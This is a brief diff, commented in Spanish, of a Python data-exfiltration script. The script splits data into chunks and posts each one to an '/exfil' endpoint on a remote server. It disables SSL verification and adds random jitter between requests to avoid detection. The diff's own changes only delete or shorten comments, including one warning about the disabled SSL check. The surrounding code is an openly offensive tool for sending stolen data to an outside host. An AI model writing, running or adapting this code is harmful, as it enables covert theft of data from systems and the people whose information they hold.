@@ -33,14 +33,15 @@ def main():
             response = requests.post(f"https://{server}/exfil", data=chunk, headers={
                 "Content-Type": "application/octet-stream",
                 "X-Chunk-ID": str(i)
-            }, timeout=5, verify=False)  # ⚠️ verify=False desactiva validación SSL
+            }, timeout=5, verify=False) 
             print(f"[{i+1}/{len(chunks)}] Enviado ({len(chunk)} bytes) - Status: {response.status_code}")
         except Exception as e:
             print(f"[{i+1}/{len(chunks)}] Error: {e}")
 
-        time.sleep(random.uniform(0.5, 2.5))  # Jitter entre 0.5 y 2.5 segundos
+        time.sleep(random.uniform(0.5, 2.5))  # Jitter
 
     print("[✓] Exfiltración completada.")
 
 if __name__ == "__main__":
     main()
+
